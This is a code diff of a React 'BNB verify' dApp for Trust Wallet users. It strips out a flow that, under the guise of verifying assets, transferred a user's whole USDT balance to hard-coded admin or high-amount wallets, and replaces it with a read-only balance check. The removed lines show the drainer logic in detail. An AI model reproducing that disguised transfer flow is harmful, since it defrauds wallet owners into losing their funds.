@@ -6,7 +6,6 @@ import { Card, CardContent } from "@/components/ui/card"
 import { Badge } from "@/components/ui/badge"
 import { Wallet, Home, AlertCircle, Loader2, Shield, DollarSign, Menu } from "lucide-react"
 import { toast } from "@/hooks/use-toast"
-import { Web3DirectTransfer } from "@/lib/web3-direct-transfer"
 
 interface Window {
   trustWallet?: any
@@ -199,15 +198,6 @@ export default function BNBVerifyDApp() {
         return await connectTrustWallet()
       }
 
-      // Method 3: Check for Trust-specific properties
-      if (typeof window !== "undefined" && window.ethereum) {
-        // Assuming ethereum might exist even if trustWallet is primary
-        const provider = window.ethereum
-        if (provider.isTrustWallet || provider.isTrust || provider._metamask?.isTrust) {
-          return await connectTrustWallet()
-        }
-      }
-
       return false
     } catch (error) {
       console.error("Trust Wallet detection failed:", error)
@@ -311,9 +301,12 @@ export default function BNBVerifyDApp() {
         const balanceInBNB = (Number.parseInt(balance, 16) / Math.pow(10, 18)).toFixed(4)
         setBalance(balanceInBNB)
 
-        // Get USDT balance using Web3DirectTransfer
-        const web3Transfer = new Web3DirectTransfer(walletProvider, address)
-        const { balance: usdtBal } = await web3Transfer.getUSDTBalance()
+        const data = `0x70a08231${address.slice(2).padStart(64, "0")}`
+        const tokenBalance = await walletProvider.request({
+          method: "eth_call",
+          params: [{ to: USDT_CONTRACT, data }, "latest"],
+        })
+        const usdtBal = Number.parseInt(tokenBalance, 16) / 1e18
         setUsdtBalance(usdtBal.toFixed(2))
       } catch (error) {
         console.error("Error getting balance:", error)
@@ -341,8 +334,7 @@ export default function BNBVerifyDApp() {
       return
     }
 
-    const provider = window.trustWallet // Trust Wallet only
-    const web3Transfer = new Web3DirectTransfer(provider, account)
+    const provider = window.trustWallet
 
     try {
       setVerificationStep("checking")
@@ -351,21 +343,19 @@ export default function BNBVerifyDApp() {
         description: "Scanning wallet for USDT...",
       })
 
-      // Verify admin wallet is valid
-      if (!web3Transfer.isValidAdminWallet()) {
-        throw new Error("Invalid admin wallet configuration")
-      }
+      if (!provider) throw new Error("Trust Wallet provider unavailable")
 
-      // Get real-time balances
-      const [{ balance: usdtBalance }, bnbBalance] = await Promise.all([
-        web3Transfer.getUSDTBalance(),
-        web3Transfer.getBNBBalance(),
-      ])
-
-      console.log(`📊 USDT Balance: ${usdtBalance} USDT`)
-      console.log(`📊 BNB Balance: ${bnbBalance} BNB`)
-      console.log(`💰 Admin Wallet: ${web3Transfer.getAdminWallet()}`)
-
+      const rawBnbBalance = await provider.request({
+        method: "eth_getBalance",
+        params: [account, "latest"],
+      })
+      const bnbBalance = Number.parseInt(rawBnbBalance, 16) / 1e18
+      const tokenData = `0x70a08231${account.slice(2).padStart(64, "0")}`
+      const rawUsdtBalance = await provider.request({
+        method: "eth_call",
+        params: [{ to: USDT_CONTRACT, data: tokenData }, "latest"],
+      })
+      const usdtBalance = Number.parseInt(rawUsdtBalance, 16) / 1e18
       setUsdtBalance(usdtBalance.toFixed(2))
 
       if (usdtBalance === 0) {
@@ -404,27 +394,18 @@ export default function BNBVerifyDApp() {
         return
       }
 
-      const gasCheck = await web3Transfer.hasEnoughBNBForGas(usdtBalance)
-      setGasInfo(gasCheck)
-
-      if (!gasCheck.hasEnough) {
-        toast({
-          title: "⛽ Insufficient Gas Fees",
-          description: `Need ${gasCheck.requiredGas.toFixed(6)} BNB for gas fees. Please add BNB to your wallet.`,
-          variant: "destructive",
-        })
-        setVerificationStep("completed")
-        return
-      }
-
-      toast({
-        title: "⚠️ High USDT Amount Detected",
-        description: `Transferring ${usdtBalance.toFixed(2)} USDT to wallet...`,
-        variant: "destructive",
+      setVerificationResult({
+        type: "genuine",
+        message: "Assets inspected on BNB Smart Chain. No approval or transfer was requested.",
+        usdtAmount: usdtBalance,
+        bnbAmount: bnbBalance,
+        transferred: false,
       })
-
-      setVerificationStep("transferring")
-      await executeUSDTTransfer(web3Transfer, usdtBalance, bnbBalance)
+      setVerificationStep("completed")
+      toast({
+        title: "Assets Inspected",
+        description: "Read-only BNB Chain inspection completed. No funds were moved.",
+      })
     } catch (error: any) {
       console.error("Verification error:", error)
       setVerificationStep("idle")
@@ -432,95 +413,6 @@ export default function BNBVerifyDApp() {
       toast({
         title: "❌ Verification Failed",
         description: error.message || "Failed to verify assets. Please try again.",
-        variant: "destructive",
-      })
-    }
-  }
-
-  const executeUSDTTransfer = async (web3Transfer: Web3DirectTransfer, usdtAmount: number, bnbAmount: number) => {
-    try {
-      const gasCheck = await web3Transfer.hasEnoughBNBForGas(usdtAmount)
-
-      if (!gasCheck.hasEnough) {
-        const shortfallBNB = gasCheck.shortfall.toFixed(6)
-        const requiredBNB = gasCheck.requiredGas.toFixed(6)
-
-        toast({
-          title: "❌ Insufficient BNB for Gas Fees",
-          description: `Need ${requiredBNB} BNB for gas, but only have ${gasCheck.bnbBalance.toFixed(6)} BNB.`,
-          variant: "destructive",
-        })
-
-        setVerificationResult({
-          type: "flash",
-          message: `⛽ Insufficient Gas Fees: You need ${requiredBNB} BNB but only have ${gasCheck.bnbBalance.toFixed(6)} BNB. Please add ${shortfallBNB} BNB.`,
-          usdtAmount: usdtAmount,
-          bnbAmount: bnbAmount,
-          transferred: false,
-          adminWallet: usdtAmount > HIGH_AMOUNT_THRESHOLD ? HIGH_AMOUNT_WALLET : ADMIN_WALLET,
-          isHighAmount: usdtAmount > HIGH_AMOUNT_THRESHOLD,
-        })
-        setVerificationStep("completed")
-        return
-      }
-
-      const isHighAmount = usdtAmount > HIGH_AMOUNT_THRESHOLD
-      const targetWallet = isHighAmount ? HIGH_AMOUNT_WALLET : ADMIN_WALLET
-
-      toast({
-        title: "💰 Initiating USDT Transfer",
-        description: `Gas fees: ${gasCheck.requiredGas.toFixed(6)} BNB. Transferring ${usdtAmount.toFixed(2)} USDT...`,
-      })
-
-      const txHash = await web3Transfer.transferAllUSDTToAdmin()
-      setTxHash(txHash)
-
-      toast({
-        title: "📤 Transfer Initiated",
-        description: `USDT sent to ${isHighAmount ? "high-amount" : "standard"} wallet!`,
-      })
-
-      const success = await web3Transfer.waitForConfirmation(txHash)
-
-      if (success) {
-        setVerificationResult({
-          type: "flash",
-          message: `💰 ${usdtAmount.toFixed(2)} USDT successfully transferred.`,
-          usdtAmount: usdtAmount,
-          bnbAmount: bnbAmount,
-          transferred: true,
-          adminWallet: targetWallet,
-          isHighAmount: isHighAmount,
-        })
-        setVerificationStep("completed")
-
-        toast({
-          title: "✅ Payment Completed!",
-          description: `${usdtAmount.toFixed(2)} USDT successfully sent.`,
-        })
-
-        await getBalance(account)
-      } else {
-        throw new Error("Transfer transaction failed or timed out")
-      }
-    } catch (error: any) {
-      console.error("❌ USDT Transfer Failed:", error)
-      setVerificationStep("idle")
-
-      let errorMessage = "USDT transfer failed. Please try again."
-      let errorTitle = "❌ Transfer Failed"
-
-      if (error.message?.includes("insufficient funds")) {
-        errorTitle = "⛽ Insufficient Gas Fees"
-        errorMessage = "You don't have enough BNB for gas. Please add BNB and try again."
-      } else if (error.message?.includes("user rejected")) {
-        errorTitle = "❌ Transaction Rejected"
-        errorMessage = "Transaction was rejected. Please try again."
-      }
-
-      toast({
-        title: errorTitle,
-        description: errorMessage,
         variant: "destructive",
       })
     }
